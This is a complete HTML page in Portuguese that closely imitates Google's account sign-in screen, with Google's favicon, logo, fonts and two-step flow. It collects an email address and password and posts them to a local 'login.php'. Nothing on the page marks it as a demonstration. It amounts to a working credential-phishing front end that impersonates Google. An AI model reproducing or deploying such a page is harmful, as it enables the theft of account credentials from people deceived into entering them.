<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fazer login nas Contas do Google</title>
    <link rel="shortcut icon" href="https://www.google.com/favicon.ico">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
        body { background-color: #f0f2f1; display: flex; justify-content: center; align-items: center; min-height: 100vh; }

        .card {
            background: #fff; width: 100%; max-width: 448px; padding: 40px; border-radius: 28px;
            position: relative; overflow: hidden;
        }

        .header { text-align: center; }
        .logo { width: 74px; margin-bottom: 12px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        .subtitle { font-size: 16px; margin-bottom: 25px; }

        .user-pill {
            display: none; align-items: center; justify-content: center; gap: 8px;
            border: 1px solid #dadce0; border-radius: 20px; padding: 4px 10px;
            margin: 0 auto 24px auto; width: fit-content; font-size: 14px;
        }

        .input-box { position: relative; margin-bottom: 5px; }
        .input-box input {
            width: 100%; padding: 13px 15px; font-size: 16px;
            border: 1px solid #747775; border-radius: 4px; outline: none; background: transparent;
        }
        .input-box label {
            position: absolute; left: 12px; top: 13px; padding: 0 5px;
            color: #444746; transition: 0.2s ease all; background: white; pointer-events: none;
        }

        .input-box input:focus + label,
        .input-box input:not(:placeholder-shown) + label { top: -8px; font-size: 12px; color: #0b57d0; }
        .input-box input:focus { border: 2px solid #0b57d0; padding: 12px 14px; }

        /* ERROS */
        .error-state input { border: 2px solid #b3261e !important; }
        .error-state label { color: #b3261e !important; }
        .error-msg { color: #b3261e; font-size: 12px; display: none; align-items: center; gap: 8px; margin-top: 5px; }

        .btn-next {
            background: #0b57d0; color: #fff; border: none; padding: 10px 24px;
            border-radius: 20px; font-weight: 500; cursor: pointer; transition: 0.2s;
        }
        .btn-next:disabled { opacity: 0.4; cursor: default; }

        .footer-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 35px; }
        
        #pass-area { display: none; }
        .remember { display: flex; align-items: center; gap: 8px; font-size: 14px; margin-top: 10px; color: #444746; }
    </style>
</head>
<body>

<div class="card" id="main-card">
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
        <h1 id="title">Fazer login</h1>
        <p id="sub" class="subtitle">Use sua Conta do Google</p>
        
        <div id="pill" class="user-pill">
            <svg style="width:18px; color:#5f6368" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
            <span id="user-email"></span>
        </div>
    </div>

    <form action="login.php" method="POST" id="login-form">
        <div id="email-area">
            <div class="input-box" id="box-email">
                <input type="email" name="email" id="email-field" placeholder=" " oninput="updateBtnState()">
                <label>E-mail ou telefone</label>
            </div>
            <div class="error-msg" id="error-email">Digite um e-mail válido</div>
            
            <div class="footer-actions">
                <a href="#" style="color:#0b57d0; text-decoration:none; font-size:14px; font-weight:500;">Criar conta</a>
                <button type="button" id="btn-1" class="btn-next" onclick="validateEmail()" disabled>Próxima</button>
            </div>
        </div>

        <div id="pass-area">
            <div class="input-box" id="box-pass">
                <input type="password" name="password" id="pass-field" placeholder=" " oninput="updateBtnState()">
                <label>Digite sua senha</label>
            </div>
            <div class="error-msg" id="error-pass">A senha deve ter pelo menos 8 caracteres</div>
            
            <label class="remember">
                <input type="checkbox" checked="checked"> Stay signed in
            </label>

            <div class="footer-actions" style="justify-content: flex-end;">
                <button type="button" id="btn-2" class="btn-next" onclick="validatePass()" disabled>Sign in</button>
            </div>
        </div>
    </form>
</div>

<script>
    function updateBtnState() {
        const email = document.getElementById('email-field').value;
        const pass = document.getElementById('pass-field').value;
        document.getElementById('btn-1').disabled = email.length < 1;
        document.getElementById('btn-2').disabled = pass.length < 1;
        
        // Limpa erros ao digitar
        document.getElementById('box-email').classList.remove('error-state');
        document.getElementById('box-pass').classList.remove('error-state');
        document.getElementById('error-email').style.display = 'none';
        document.getElementById('error-pass').style.display = 'none';
    }

    function validateEmail() {
        const email = document.getElementById('email-field').value;
        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (regex.test(email)) {
            document.getElementById('email-area').style.display = 'none';
            document.getElementById('sub').style.display = 'none';
            document.getElementById('title').innerText = 'Olá!';
            document.getElementById('user-email').innerText = email;
            document.getElementById('pill').style.display = 'flex';
            document.getElementById('pass-area').style.display = 'block';
        } else {
            document.getElementById('box-email').classList.add('error-state');
            document.getElementById('error-email').style.display = 'flex';
        }
    }

    function validatePass() {
        const pass = document.getElementById('pass-field').value;
        if (pass.length < 8) {
            document.getElementById('box-pass').classList.add('error-state');
            document.getElementById('error-pass').style.display = 'flex';
        } else {
            document.getElementById('login-form').submit();
        }
    }
</script>

</body>
</html>
